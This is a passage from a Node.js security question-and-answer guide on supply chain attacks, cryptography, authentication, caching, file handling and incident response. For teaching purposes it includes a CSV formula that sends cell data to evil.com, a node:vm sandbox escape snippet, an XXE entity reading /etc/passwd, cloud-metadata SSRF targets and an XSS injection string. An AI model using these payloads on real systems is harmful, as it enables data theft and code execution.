    tenantId,
  ]);
  const { rows } = await client.query("SELECT * FROM invoices");
  await client.query("COMMIT");
  return rows;
} catch (err) {
  await client.query("ROLLBACK");
  throw err;
} finally {
  client.release();
}
```

The app's database role must not own the tables or have `BYPASSRLS`, or the policies are skipped.

## 329: How did the node-serialize vulnerability work?

`node-serialize` stored functions as strings marked with `_$$ND_FUNC$$_` and rebuilt them with `eval` when unserializing. By adding `()` at the end of the function body, an attacker made it an immediately invoked function expression, so it ran during `unserialize()`. Any app that unserialized cookies or request data got remote code execution (CVE-2017-5941). The lesson: never use a format that can carry code for untrusted data.

## 330: Why is passing req.query or req.body to res.render dangerous?

Some template engines read special options from the same object as the template data. EJS, for example, had a bug (CVE-2022-29078) where `res.render('page', req.query)` let attackers set options like `outputFunctionName` and inject code into the compiled template. Always pass an explicit object with only the values the template needs.

```js
res.render("profile", { name: user.name, bio: user.bio });
```

## 331: Show how code can escape a node:vm context.

```js
import vm from "node:vm";

const result = vm.runInNewContext(
  'this.constructor.constructor("return process")().version',
);
console.log(result); // host process version
```

The context's global object was created by the host, so its `constructor.constructor` is the host's `Function`. Through it, the code reaches the real `process` and from there `require`, the file system and `child_process`. Any host object passed in creates the same kind of bridge.

## 332: How does the permission model compare with containers and seccomp?

The permission model works inside the Node.js process and understands Node.js APIs (file paths, child processes, workers). Containers and seccomp work at the OS level and also catch native code and anything the runtime does not check. The permission model is easy to add and good against mistakes and some supply chain behavior, but it is not a sandbox against malicious code. Use both: OS isolation as the real boundary, permission model as an extra layer.

## 333: Describe some well-known npm supply chain attacks and what they teach.

- **event-stream (2018):** a new maintainer added a dependency that stole crypto wallets. Lesson: maintainer handovers are a risk.
- **ua-parser-js (2021):** a hijacked account published versions with a cryptominer and password stealer. Lesson: 2FA and quick detection.
- **node-ipc (2022):** the author added code that wiped files on machines in certain countries. Lesson: even trusted authors can push harmful updates.
- **chalk, debug and others (September 2025):** a phished maintainer's account published versions that hijacked crypto transactions in browsers.
- **Shai-Hulud (2025):** a self-spreading worm stole npm tokens through install scripts and used them to publish infected versions of more packages.

Common defenses: lockfiles, delayed adoption of new versions, no install scripts by default, provenance and trusted publishing.

## 334: What is trusted publishing on npm?

Trusted publishing lets a CI system (GitHub Actions, GitLab CI) publish a package using a short-lived OIDC token instead of a long-lived npm token. You configure on npmjs.com which repo and workflow may publish the package. There is no token to steal from a developer machine or CI secrets, and provenance is generated automatically. It became generally available in 2025 and npm has been moving maintainers away from long-lived tokens since then.

## 335: What is a dependency confusion attack?

Your company uses an internal package like `acme-billing` from a private registry. An attacker publishes a package with the same name and a higher version on the public npm registry. If your install setup checks both registries, it may pick the public one and run the attacker's code. Prevent it with scoped names (`@acme/billing`) mapped to your private registry in `.npmrc`, and by registering your scope on the public registry.

```
@acme:registry=https://npm.internal.acme.com/
```

## 336: What is lockfile injection and how do you catch it?

In a pull request, an attacker changes the `resolved` URL or `integrity` hash of a package in `package-lock.json` to point to a malicious tarball. Lockfile diffs are large and rarely reviewed, so it can slip through. Tools like `lockfile-lint` check that every `resolved` URL uses an allowed host and HTTPS. Also regenerate lockfiles yourself instead of trusting ones from outside contributors.

```bash
npx lockfile-lint --path package-lock.json --allowed-hosts npm --validate-https
```

## 337: What are SLSA and Sigstore?

SLSA (Supply-chain Levels for Software Artifacts) is a framework of levels describing how trustworthy a build is, focused on build provenance: where, how and from what source an artifact was built. Sigstore is the open signing system (Fulcio, Rekor, cosign) that npm provenance uses: signatures are tied to a CI identity and logged in a public transparency log. Together they let consumers check that a package was built from the claimed source.

## 338: What is VEX and how does it relate to an SBOM?

A Vulnerability Exploitability eXchange document states whether a product is actually affected by a known vulnerability in one of its components, for example "not affected: vulnerable code is not in the execute path." An SBOM says what is inside; VEX says which CVEs matter. Together they cut down false alarms from scanners that only match versions.

## 339: How do you reduce the blast radius if a dependency turns malicious?

- Run the app with the least privilege: non-root, read-only file system, limited network egress.
- Keep secrets out of the build environment and out of developer machines where possible.
- Use the permission model to block unexpected file writes and child processes.
- Restrict outgoing network traffic with an egress allowlist.
- Separate build, test and deploy credentials so one stolen token cannot do everything.

## 340: How would you detect a malicious dependency update before it reaches production?

- Delay new versions with a minimum release age.
- Review dependency diffs in update PRs, focusing on new install scripts, new network or `child_process` calls, obfuscated code and new dependencies.
- Use tools like Socket.dev that flag behavior changes in new versions.
- Check that provenance is present and points to the expected repo.
- Run tests in CI with no secrets and with network egress monitoring.

## 341: Why are native addons a special supply chain risk?

Native addons (`.node` files) are compiled C or C++ code. They can do anything the process can, bypass the permission model and JavaScript-level checks, and are hard to review, especially prebuilt binaries downloaded during install. Prefer pure JavaScript or WebAssembly alternatives where they are good enough, check that prebuilt binaries come from the project's official releases, and keep `--allow-addons` off unless needed.

## 342: How do you design secrets management for a fleet of Node.js services?

- Each service gets its own identity (IAM role, Kubernetes service account) and reads only its own secrets.
- Secrets live in a central manager with audit logs, versioning and automated rotation.
- Prefer short-lived credentials: database credentials from Vault's dynamic secrets, cloud tokens from workload identity.
- Deliver secrets at runtime (files, SDK calls), not baked into images.
- Have a tested process for emergency rotation of every secret type.

## 343: What is envelope encryption?

You encrypt data with a random data key (DEK), then encrypt the DEK with a master key (KEK) held in a KMS. You store the encrypted data next to the encrypted DEK. To read, you ask the KMS to decrypt the DEK, then decrypt the data locally. The master key never leaves the KMS, rotating it only needs re-encrypting the small DEKs, and the KMS logs every use.

## 344: How do you implement field-level encryption for sensitive columns in a Node.js app?

Encrypt sensitive fields (like national ID numbers) in the app before they reach the database, with AES-256-GCM and keys from a KMS. Store a key version with each value so you can rotate keys. Pass a context such as the record ID as additional authenticated data, so an encrypted value cannot be copied to another row. If you need to search, store a separate HMAC of the normalized value as a "blind index."

```js
cipher.setAAD(Buffer.from(`users:${userId}:ssn`));
```

## 345: How does a Node.js process get a good source of randomness?

`crypto.randomBytes` and friends use OpenSSL's CSPRNG, which is seeded from the operating system (`getrandom()` on Linux). `crypto.getRandomValues` and `randomUUID` use the same source. You do not need to seed anything yourself. The only rule is to never use `Math.random()` for security, and to use the async `randomBytes` for large amounts in a hot path.

## 346: What is the difference between AES-GCM and AES-CBC with HMAC, and which should you use?

AES-GCM is an AEAD mode: it encrypts and authenticates in one step, and is fast with hardware support. AES-CBC alone has no integrity and was the source of padding oracle attacks; it is only safe combined with an HMAC in "encrypt-then-MAC" order with separate keys. For new code, use AES-256-GCM or ChaCha20-Poly1305 (`chacha20-poly1305` in Node.js). Use CBC only to read legacy data.

## 347: Why should you prefer libraries like jose or libsodium wrappers over hand-written crypto?

Even with correct primitives, details like IV handling, key encoding, algorithm agility, constant-time checks and error behavior are easy to get wrong in subtle ways that tests will not catch. Well-reviewed libraries put those decisions in one place. Write your own composition only if you can explain every choice and have it reviewed by someone who knows cryptography.

## 348: How do you handle TLS certificate rotation in a long-running Node.js server?

Call `server.setSecureContext()` with the new key and certificate when the files change. New connections use the new certificate without a restart; existing ones keep the old one until they close.

```js
import { watch, readFileSync } from "node:fs";

watch("/etc/tls", () => {
  server.setSecureContext({
    key: readFileSync("/etc/tls/tls.key"),
    cert: readFileSync("/etc/tls/tls.crt"),
  });
});
```

Debounce the reload and catch errors, so a half-written file does not crash the server.

## 349: What are the trade-offs of certificate pinning in a Node.js client?

Pinning (checking the server's public key against a known value with a custom `checkServerIdentity`) stops attacks using a fake certificate from a compromised or misissued CA. But if the server rotates its key and you did not plan for it, every request fails. Pin to keys you control, include a backup pin, or pin to an intermediate CA. For most services, normal CA validation plus Certificate Transparency monitoring is enough.

## 350: How do you make outgoing HTTP requests from Node.js safer by default?

- Always set timeouts (`AbortSignal.timeout()` for `fetch`).
- Limit response size while streaming instead of buffering everything.
- Keep TLS verification on.
- Use a custom agent or dispatcher with SSRF checks for any user-supplied URLs.
- Do not forward incoming auth headers or cookies to other hosts.
- Log the target host and status, not full URLs with tokens in query strings.

## 351: What is log injection and how do structured logs help?

If you write user input into plain text logs, an attacker can add newlines and fake entries like `\n2026-11-13 INFO admin login ok`, or add terminal escape codes that change what an operator sees. Structured JSON logging (pino, winston with JSON format) puts user input inside quoted, escaped string fields, so it cannot create new lines or fields. Still strip control characters from values that end up in text views.

## 352: How do you keep personal data out of traces and metrics?

OpenTelemetry auto-instrumentation can record URLs with query strings, SQL statements with values, and headers. Configure the instrumentations to skip or sanitize these (for example, turn off capture of request headers and use parameterized SQL so values are not in the statement), and add a span processor that removes attributes matching sensitive keys. Metric labels should never hold user IDs or emails, both for privacy and to keep cardinality low.

## 353: What is the difference between operational errors and programmer errors, and why does it matter for security?

Operational errors are expected failures, like a timeout, a missing file or invalid input; you handle them and continue. Programmer errors are bugs, like reading a property of `undefined`; the process state may now be wrong. Catching and ignoring programmer errors can leave half-done authorization checks or corrupt state. Handle operational errors locally and let programmer errors crash the process after logging.

## 354: How should an auth middleware behave when its backing store is down?

It should fail closed: if Redis (sessions) or the token introspection service is not reachable, treat the request as unauthenticated and return 503 or 401, not let it through. A common bug is a `try/catch` that logs the error and calls `next()` anyway. For non-security features (recommendations, analytics), failing open may be fine; decide on purpose for each dependency.

```js
app.use(async (req, res, next) => {
  try {
    req.user = await loadSession(req);
    next();
  } catch (err) {
    req.log.error({ err }, "session store unavailable");
    res.status(503).json({ error: "Service unavailable" });
  }
});
```

## 355: How do race conditions cause security bugs in Node.js apps?

Node.js is single-threaded, but `await` points let other requests run in between. A "check then act" flow like "read balance, check it is enough, then write the new balance" can run twice in parallel and both checks pass, allowing double spending or using a coupon twice. Fix it with atomic database operations, transactions with the right isolation level or row locks, or unique constraints.

```sql
UPDATE accounts SET balance = balance - $1
WHERE id = $2 AND balance >= $1
RETURNING balance;
```

If no row is returned, the balance was too low.

## 356: How do idempotency keys help security and reliability?

The client sends a unique `Idempotency-Key` header with a request like "create payment." The server stores the key with the result and returns the stored result for repeats. This stops duplicate charges from retries and also blocks replay of the same request by an attacker. Scope keys per user, store a hash of the request body to reject a reused key with different data, and expire them after a while.

## 357: How can attackers bypass IP-based rate limiting, and how do you prevent it?

- Spoofing `X-Forwarded-For` when `trust proxy` is set too broadly. Set it to the exact number of proxies.
- Rotating IPv6 addresses inside their own /64. Limit by IPv6 subnet; `express-rate-limit` groups IPv6 addresses by /56 by default (the `ipv6Subnet` option).
- Using large proxy or botnet pools. Add per-account limits, device signals and bot detection.
- Using different endpoints or GraphQL batching. Limit by operation, not only by path.

## 358: Why should you not put access tokens in WebSocket URLs, and what is the alternative?

Browsers cannot set custom headers on WebSocket connections, so people put tokens in the query string. URLs end up in proxy logs, server logs, browser history and monitoring tools. Better options: use the session cookie (with an `Origin` check), or get a short-lived, single-use "ticket" from an authenticated HTTP endpoint and pass that in the URL instead.

```js
app.post("/ws-ticket", requireAuth, async (req, res) => {
  const ticket = crypto.randomBytes(24).toString("base64url");
  await redis.set(`ws:${ticket}`, req.user.id, { EX: 30 });
  res.json({ ticket });
});
// on upgrade: GETDEL ws:<ticket>, reject if missing
```

## 359: How do you handle token expiry and revocation on long-lived WebSocket connections?

A connection checked once at handshake can stay open for hours after the user logs out or loses access. Options:

- Store the token's expiry on the connection and close it when reached, letting the client reconnect.
- Subscribe to revocation events (for example through Redis pub/sub) and close matching connections.
- Recheck authorization when the user joins a room or does a sensitive action, not only at connect time.

## 360: Why should you turn off field suggestions in a production GraphQL API?

Even with introspection off, GraphQL servers often reply to a typo with "Did you mean `internalNotes`?" Attackers use tools that send guesses and collect these hints to rebuild most of the schema. GraphQL Armor has a `blockFieldSuggestions` plugin, and Apollo Server lets you change error messages in `formatError`. It is a small hardening step, not a replacement for authorization.

## 361: How do you secure GraphQL subscriptions?

Subscriptions usually run over WebSockets with the `graphql-ws` protocol. Authenticate in the `onConnect` callback using connection params or cookies, and reject the connection if that fails. Then check authorization per subscription and per event: a user subscribed to `orderUpdated` must only get events for their own orders, so filter on the server, not in the client.

## 362: How can DataLoader leak data between users?

DataLoader caches results by key. If you create one loader for the whole app instead of one per request, the cache is shared: user A's request loads `order:42` with A's permissions, and user B later gets it from the cache without any check. Always create loaders per request in the GraphQL context, and do authorization after loading, not only in the batch function.

```js
context: async ({ req }) => ({
  user: req.user,
  loaders: { order: new DataLoader((ids) => loadOrders(ids, req.user)) },
}),
```

## 363: How can HTTP caching leak private data?

If a response with user-specific data is cached by a CDN or shared proxy, the next user can receive it. This happens when the app sends `Cache-Control: public` or long `max-age` on personalized pages, or when the CDN caches by URL only. Send `Cache-Control: private, no-store` on authenticated responses, add `Vary` for headers that change the response, and configure the CDN to bypass cache when auth cookies or headers are present.

## 364: What are web cache poisoning and web cache deception?

- **Poisoning:** the attacker sends a request with an unkeyed input (like `X-Forwarded-Host`) that changes the response, and the cache stores that bad response for everyone. Do not use unkeyed headers to build responses.
- **Deception:** the attacker tricks a victim into visiting `/account/profile.css`. The app ignores the suffix and returns the private page, and the CDN caches it because it looks like a static file. Make routing strict and cache only real static paths.

## 365: How can serializing server state into HTML cause XSS in SSR apps?

SSR apps often embed data in a `<script>` tag for hydration: `<script>window.__STATE__ = ${JSON.stringify(state)}</script>`. If any value contains `</script><script>alert(1)</script>`, the browser closes the tag early and runs the attacker's script, because `JSON.stringify` does not escape `<`. Escape `<`, `>`, `&`, U+2028 and U+2029, or use a library like `serialize-javascript` or `devalue`.

```js
const safeJson = JSON.stringify(state).replace(/</g, "\\u003c");
```

## 366: What is strict-dynamic in CSP and why is it useful?

`'strict-dynamic'` tells the browser to trust scripts that are loaded by an already trusted (nonced or hashed) script, and to ignore host allowlists. This makes nonce-based CSP practical for apps that load scripts dynamically, and it avoids weak host allowlists that attackers bypass through JSONP endpoints or old libraries on allowed CDNs. A typical strict policy is `script-src 'nonce-...' 'strict-dynamic'; object-src 'none'; base-uri 'none'`.

## 367: What are Trusted Types?

Trusted Types is a browser feature enabled through CSP (`require-trusted-types-for 'script'`). Once on, DOM sinks like `innerHTML` and `script.src` reject plain strings and accept only objects created by a policy you define. This stops DOM-based XSS at the sink. A Node.js server's job is to send the header; the front-end code has to be adapted to use policies. Browser support is still not universal, so treat it as an extra layer.

## 368: How do you render user Markdown safely on a Node.js server?

Markdown allows raw HTML and links like `[x](javascript:alert(1))`. Turn off raw HTML in the renderer (for example `markdown-it` with `html: false`, which is its default), check link protocols, and sanitize the final HTML with an allowlist sanitizer anyway. Sanitize after rendering, not before, because the renderer can create HTML from harmless-looking input.

## 369: Why are SVG uploads dangerous?

SVG is XML that can contain `<script>`, event handlers and links. If you serve an uploaded SVG from your domain and a user opens it directly, the script runs with your origin, which is stored XSS. Either do not accept SVG, convert it to PNG, sanitize it with a strict SVG sanitizer, or serve user files from a separate sandbox domain with `Content-Disposition: attachment` and a CSP like `default-src 'none'`.

## 370: What risks come with generating PDFs from user HTML with Puppeteer or Playwright?

The headless browser runs on your server network. User-supplied HTML can load `file:///etc/passwd`, `http://169.254.169.254/` or internal services through images, iframes or scripts, and include the result in the PDF, which is SSRF. Turn off JavaScript if possible, block all requests except to allowed hosts with request interception, run the browser in a separate sandboxed container with no internal network access, and set timeouts.

## 371: What is CSV injection?

When users export data to CSV and open it in Excel or Google Sheets, cells starting with `=`, `+`, `-`, `@`, tab or carriage return can be treated as formulas. A value like `=HYPERLINK("http://evil.com?"&A1, "Click")` can leak data or trick the user. Prefix such cells with a single quote `'` or otherwise neutralize them when generating exports, and quote fields properly.

## 372: What is XXE and how do you avoid it in Node.js XML parsing?

XML External Entity attacks define entities that point to files or URLs, like `<!ENTITY x SYSTEM "file:///etc/passwd">`, and the parser inlines the content. Most pure JavaScript XML parsers (like `fast-xml-parser`) do not resolve external entities. With `libxmljs`, do not set `noent: true` on untrusted input. Also limit entity expansion to avoid "billion laughs" memory attacks, and prefer JSON if you control the format.

## 373: How do you stop login timing from revealing whether an account exists?

If the user does not exist, the code often returns right away; if it exists, it spends 100+ ms on password hashing. Attackers measure the difference. Run a hash verification against a dummy hash when the user is not found, so both paths take about the same time.

```js
const DUMMY_HASH = await argon2.hash("dummy-password-for-timing");

const user = await findUserByEmail(email);
const ok = await argon2.verify(user?.passwordHash ?? DUMMY_HASH, password);
if (!user || !ok)
  return res.status(401).json({ error: "Invalid email or password" });
```

## 374: How do you restrict outbound network traffic from Node.js pods?

Use Kubernetes `NetworkPolicy` with a default-deny egress rule, then allow only the destinations the service needs (its database, DNS, specific APIs). Many CNI plugins (Cilium, Calico) also support DNS-name-based rules. This limits data theft and SSRF impact, and it blocks malicious dependencies from calling home. For fine-grained control, route outbound HTTP through an egress proxy with an allowlist.

## 375: What is --frozen-intrinsics?

It is an experimental Node.js flag that freezes built-in objects and prototypes like `Object.prototype`, `Array.prototype` and `Function.prototype` before any user code runs. That blocks prototype pollution and stops dependencies from monkey-patching built-ins. Many packages and some polyfills break with it, so it fits best in small, well-tested services. It does not make untrusted code safe to run.

## 376: What happened to the Node.js policy feature?

`--experimental-policy` let you define integrity hashes and allowed dependencies in a manifest that Node.js checked at load time. It stayed experimental, had several bypasses, and was removed from Node.js in favor of the permission model and external tools. If you see it in an old project, plan to replace it with lockfile integrity checks, the permission model and container-level controls.

## 377: How would you design brute-force protection for a large login system?

- Rate limit per IP, per IP subnet, per account and globally, with sliding windows in Redis.
- Score each attempt with signals: known bad IPs, unusual geography, device fingerprint, breached password.
- Escalate responses gradually: add delay, then require CAPTCHA, then require MFA or email verification.
- Alert on spikes in failures across many accounts (credential stuffing), not only per account.
- Check new passwords against breach lists (for example Have I Been Pwned's k-anonymity API).

## 378: How do you check a password against breached password lists without sending the password?

Have I Been Pwned's Pwned Passwords API uses k-anonymity. You hash the password with SHA-1, send only the first 5 hex characters, and get back all hash suffixes with that prefix. You check locally if your full hash is in the list. The service never sees the password or its full hash.

```js
import { createHash } from "node:crypto";

async function isBreached(password) {
  const sha1 = createHash("sha1").update(password).digest("hex").toUpperCase();
  const prefix = sha1.slice(0, 5);
  const suffix = sha1.slice(5);
  const res = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`, {
    headers: { "Add-Padding": "true" },
    signal: AbortSignal.timeout(3000),
  });
  const body = await res.text();
  return body
    .split("\n")
    .some((line) => line.startsWith(suffix + ":") && !line.endsWith(":0"));
}
```

SHA-1 is fine here because it is only a lookup key, not password storage.

## 379: How do you design a secure password reset flow end to end?

1. Accept an email and always return the same response.
2. If the account exists, create a random token, store only its hash with a short expiry and the user ID.
3. Email a link built from a fixed base URL, not the Host header.
4. On the reset page, look up the hashed token, check expiry, and accept a new password that meets your rules.
5. Delete the token, hash the new password, invalidate all sessions and refresh tokens, and notify the user by email.
6. Rate limit both the request and the reset endpoints.

Keep the token out of logs and set `Referrer-Policy: no-referrer` on the reset page so it does not leak to third parties.

## 380: How should MFA recovery codes be generated and stored?

Generate around 10 random codes with a CSPRNG, show them once and store only their hashes (a fast hash is fine for long random codes; use a slow hash if they are short). Each code works once and is marked used. Using a recovery code should notify the user, and regenerating codes should invalidate the old set. Rate limit attempts, since codes are shorter than passwords.

## 381: How do you implement TOTP verification safely?

- Generate the secret with a CSPRNG and store it encrypted, not in plain text.
- Confirm setup by asking for a valid code before turning MFA on.
- Accept a small time window (current step ±1) for clock drift.
- Remember the last used time step per user to stop replay of the same code.
- Rate limit attempts, because a 6-digit code has only a million values.
- Compare codes in constant time.

## 382: What is session hijacking and how do you detect it?

It is when an attacker uses a stolen session ID or token, taken through XSS, malware, a log leak or network sniffing. Prevention is mostly about cookie flags, HTTPS and XSS defense. For detection, record context at login (rough location, user agent, device ID) and flag big changes, like the same session used from two countries at once. On suspicion, require re-authentication instead of instantly killing the session, to avoid locking out real users who changed networks.

## 383: How do you build a "log out from all devices" feature?

With server sessions, keep an index of session IDs per user (a Redis set) and delete them all. With JWTs, store a `tokensValidAfter` timestamp on the user and reject access tokens with `iat` before it; also revoke all refresh tokens in the database. Trigger the same logic on password change and when an admin disables an account.

## 384: Why is it risky to trust claims from an ID token for authorization in your API?

An ID token is meant for the client app to learn who the user is. Its audience is the client, not your API, and it is not meant to be sent as a bearer token. APIs should accept access tokens issued for their own audience. Using ID tokens as API credentials can let a token issued for one app be replayed against another, and skips scope checks.

## 385: How do you safely support "Sign in with Google" and link it to existing accounts?

Use the OIDC `sub` claim with the issuer as the stable identifier, not the email. If you link to an existing local account by email, only do it when the provider says the email is verified (`email_verified: true`) and the provider is authoritative for that domain; otherwise an attacker can create an account with someone else's email at a weak provider and take over the account. Safer still, ask the user to log in to the existing account first and link from there.

## 386: What is account takeover through a pre-hijacking attack?

The attacker signs up on your site with the victim's email and a password before the victim ever does. Later, the victim signs in with SSO using the same email, and the app merges the accounts, while the attacker's password still works. Require email verification before an account is active, and on SSO linking to an unverified account, reset existing credentials and sessions.

## 387: How do you safely implement "impersonate user" for support staff?

- Allow it only for specific roles, with MFA and a reason field.
- Create a separate session that records both the staff ID and the target user ID.
- Show a clear banner in the UI and limit actions (no password changes, no payments).
- Log every action with both IDs, and notify the user if your policy allows.
- Time-limit the impersonation session.

## 388: How do you design authorization checks so they are hard to forget?

- Default deny: routes without an explicit policy fail.
- Put checks in a central layer, like a policy service or repository methods that take the current user, not in each handler.
- Use helpers that return only rows the user may access, so the safe call is also the easy call.
- Add tests that list all routes and fail if one has no policy attached.
- Review new endpoints with a short checklist.

## 389: What is BOLA and why is it the top API risk?

Broken Object Level Authorization is the API name for IDOR: endpoints that take an object ID and do not check that the caller may access that object. It tops the OWASP API Security Top 10 because APIs expose IDs everywhere and checks must be repeated for every object type and endpoint. Fix it with ownership checks in queries and centralized authorization.

## 390: What is broken function level authorization?

Users can call functions meant for other roles, such as admin endpoints, by guessing URLs (`/api/admin/users`) or changing the HTTP method (`DELETE` on a resource where only `GET` was checked). Apply role and permission checks to every route and method, group admin routes under a router with its own guard, and avoid hiding admin features only in the UI.

## 391: How do you protect against mass data scraping through a legitimate API?

- Require auth for anything not meant to be public.
- Limit page size and the total number of items one user can read per time window.
- Use non-sequential IDs so records cannot be walked.
- Return only the fields the client needs.
- Watch for unusual read volumes per account and alert.

## 392: How should an API handle large result sets securely?

Never let the client set an unlimited `limit`. Cap page size on the server, use cursor-based pagination and enforce a timeout on queries. For exports, run them as background jobs with their own rate limits and access checks, and deliver files through short-lived signed URLs.

## 393: How do signed URLs work for private file downloads?

The server creates a URL that includes an expiry time and a signature (HMAC or a cloud provider's signature) over the path and expiry. The storage service or your server checks the signature and expiry before serving. Anyone with the URL can download until it expires, so keep expiry short (minutes), scope it to one object and do not log full signed URLs.

```js
import { GetObjectCommand, S3Client } from "@aws-sdk/client-s3";
import { getSignedUrl } from "@aws-sdk/s3-request-presigner";

const url = await getSignedUrl(
  new S3Client({}),
  new GetObjectCommand({
    Bucket: "invoices",
    Key: `${user.id}/${invoiceId}.pdf`,
  }),
  { expiresIn: 300 },
);
```

## 394: How do you secure presigned upload URLs?

Check the user's right to upload before creating the URL. Generate the object key yourself (for example `uploads/<userId>/<uuid>`), never from the client. Limit content type and size with a presigned POST policy (`content-length-range`), set a short expiry, and process the uploaded file (scan, type check) asynchronously before making it available to others.

## 395: How do you scan uploaded files for malware in a Node.js pipeline?

Upload files to a quarantine bucket or folder first. A background worker scans them (for example with ClamAV through `clamscan`, or a cloud malware scanning service), checks the real type and size, and moves clean files to the final location. Infected files are deleted and the event is logged. Never let users or other services read from the quarantine area.

## 396: Why should image processing run in a separate worker or service?

Image libraries parse complex formats in native code, and many have had memory bugs. Big or crafted images can use lots of CPU and memory. Running processing in a worker pool or separate container with resource limits keeps a crash or hang from taking down the API, and limits the damage of a parser exploit.

## 397: What are the risks of using child_process to call tools like ImageMagick or ffmpeg?

These tools support many formats and features, some of which read local files or URLs (ImageMagick's "ImageTragick" bugs, ffmpeg's HLS playlists that fetch remote or local files). Even with `execFile`, the input file itself can be the attack. Use a policy file to turn off risky ImageMagick coders, restrict ffmpeg protocols (`-protocol_whitelist file`), run them sandboxed with no network, and set time and memory limits.

## 398: How does Node.js handle null bytes in file paths, and why does it matter?

Older systems treated a null byte as the end of the string, so `file.txt\0.png` could pass a `.png` check but open `file.txt`. Node.js `fs` functions throw `ERR_INVALID_ARG_VALUE` (or a similar error) when a path string contains a null byte, so that classic trick does not work in Node.js. The error path still needs handling so it does not crash the request or leak details.

## 399: What is the risk of following symlinks when serving static files?

If an attacker can create a symlink in a served folder (for example by uploading a crafted archive that is extracted there), the static server may follow it to `/etc` or your app's secrets. Do not extract archives into served folders, check entries for symlinks during extraction, and keep uploads in a separate storage system that does not support symlinks, like object storage.

## 400: How do you limit what a compromised Node.js process can read on disk?

- Run as a non-root user that owns only the app and data folders.
- Use a read-only root file system and mount only the needed volumes.
- Turn on the permission model with `--allow-fs-read` limited to the app folder.
- Keep secrets in memory from a secrets manager, not in files on disk.
- Do not mount the Docker socket or host paths into the container.

## 401: How does coverage-guided fuzzing work, and what would you fuzz in a Node.js app?

The fuzzer runs your function with generated inputs, watches which code paths each input reaches, and keeps and mutates inputs that reach new paths. Over time it explores deep branches that random input would miss. Good targets are parsers (custom file formats, query languages, header parsing), sanitizers, URL and path helpers, and anything with complex regexes. Report crashes, hangs (timeouts) and broken invariants as findings.

## 402: How do you write a fuzz target for a Node.js function?

With Jazzer.js, a fuzz target is a function that takes a `Buffer`:

```js
// fuzz/parse-filter.fuzz.js
import { parseFilter } from "../src/parse-filter.js";

export function fuzz(data) {
  const input = data.toString("utf8");
  try {
    parseFilter(input);
  } catch (err) {
    if (!(err instanceof SyntaxError)) throw err; // only expected errors are ok
  }
}
```

```bash
npx jazzer fuzz/parse-filter.fuzz.js --sync -- -max_total_time=300
```

Unexpected error types, crashes and timeouts become findings, and the inputs that caused them are saved for regression tests.

## 403: How do you fit SAST, DAST, SCA and fuzzing into one pipeline without slowing teams down?

- On every pull request: fast SAST (Semgrep, ESLint rules), secret scanning and dependency checks (SCA) on changed files. Block only on high-confidence, high-severity findings.
- On merge to main: full CodeQL scan, container image scan, SBOM generation.
- Nightly or weekly: DAST full scan against staging, longer fuzzing runs, re-scan of deployed images for new CVEs.
- Route findings to the owning team with SLAs by severity, and track false positive rates so rules stay useful.

## 404: How do you reduce false positives from security scanners?

Tune rules to your stack (turn off rules for frameworks you do not use), add sanitizer and validator functions to the tool's data flow model so it knows they clean data, and mark accepted findings with a reason in code or the tool's UI, never by silently deleting them. Check reachability: many dependency CVEs affect code paths you never call. Review the rule set every few months.

## 405: What is reachability analysis in dependency scanning?

Basic SCA tools flag a package if its version is in a vulnerable range. Reachability analysis checks whether your code actually calls the vulnerable function, directly or through other dependencies. It can cut alert volume a lot, but it is not perfect with dynamic JavaScript (like `require` with variables or dynamic property access), so do not ignore unreachable findings forever; just lower their priority.

## 406: How do you run a threat model for a new Node.js feature like file sharing?

1. Draw the data flow: browser, API, storage, workers, third parties, and trust boundaries between them.
2. Go through STRIDE per element: spoofing (who can share?), tampering (can files be changed?), repudiation (is it logged?), information disclosure (link guessing, caching), denial of service (huge files), elevation of privilege (sharing someone else's file).
3. Pick controls for each threat: signed expiring links, ownership checks, size limits, malware scanning, audit logs.
4. Write them as testable requirements and review them when the design changes.

## 407: Walk through what you do in the first hour after finding out an npm token was stolen.

- Revoke the token right away and rotate any other tokens on the same machine or CI.
- Check npm for versions published after the likely theft time; unpublish or deprecate malicious ones and contact npm support.
- Find out how it was stolen: an infected dependency, a leaked CI log, a phished account.
- Tell users of your packages through an advisory if a bad version was published.
- Turn on trusted publishing and 2FA for publishing so it cannot happen the same way again.

## 408: What are the phases of incident response?

A common model (based on NIST) has these phases:

1. **Preparation:** plans, contacts, logging, tooling and practice.
2. **Detection and analysis:** spot the incident and judge its scope and severity.
3. **Containment:** stop it spreading, for example by isolating hosts or revoking credentials.
4. **Eradication:** remove the cause, like a backdoor or a malicious dependency.
5. **Recovery:** restore service safely and watch for signs of return.
6. **Lessons learned:** a blameless review and follow-up fixes.

## 409: How do you contain a compromised Node.js service without destroying evidence?

Take the instance out of the load balancer instead of deleting it. Snapshot disks and capture memory or a heap snapshot if possible. Revoke the credentials it could reach (database users, cloud roles, API keys) and block its outbound traffic. Deploy a clean version from a known good build to restore service. Only destroy the compromised instance after you have collected what you need.

## 410: What logs do you need ready before an incident happens?

- App logs with request IDs, user IDs and outcomes for security events.
- Load balancer or proxy access logs with IPs and user agents.
- Cloud audit logs (CloudTrail, Cloud Audit Logs) for IAM and resource changes.
- Database audit logs for sensitive tables.
- CI/CD and package publishing logs.
- Retention long enough to cover a typical detection delay, often months, stored where an attacker cannot delete them.

## 411: How should a team handle a vulnerability reported in its own Node.js open-source package?

Acknowledge the report quickly, reproduce it privately and agree on a timeline with the reporter. Open a private GitHub security advisory, develop the fix in its private fork and request a CVE through GitHub. Release patched versions for all supported major lines at the same time, then publish the advisory so `npm audit` and Dependabot alert users. Credit the reporter if they want.

## 412: How does the Node.js project manage security releases?

Reports come in through HackerOne and are triaged by the security team against the threat model. Fixes are prepared in private, a pre-announcement goes out about a week before with affected lines and the highest severity (but no details), then patched versions for all supported release lines ship on the same day with CVEs and a blog post. Dependencies like OpenSSL, llhttp and undici are also updated in these releases when they have security fixes.

## 413: How do you plan for Node.js security releases in a large organization?

- Track which services run which Node.js versions (from SBOMs or image metadata).
- Keep base images and build pipelines able to update the runtime in one change.
- When a pre-announcement comes, reserve time, check which lines and severity apply, and prepare test runs.
- Roll out patched images in stages with monitoring, starting with internet-facing services.
- Use the CVE details after release to decide if any service needs extra steps, like config changes.

## 414: How do you decide how fast to patch a dependency vulnerability?

Look at severity, but also at your context: is the vulnerable code reachable, is the service internet-facing, is there a public exploit or active exploitation (CISA's KEV list, EPSS score), and what data is at risk. A critical but unreachable bug in a dev tool can wait for the normal cycle; a medium bug in your login path with a public exploit should be fixed right away. Write these rules down as SLAs.

## 415: How would you secure a Node.js app that must accept webhooks from many third parties?

- Give each integration its own endpoint path and secret.
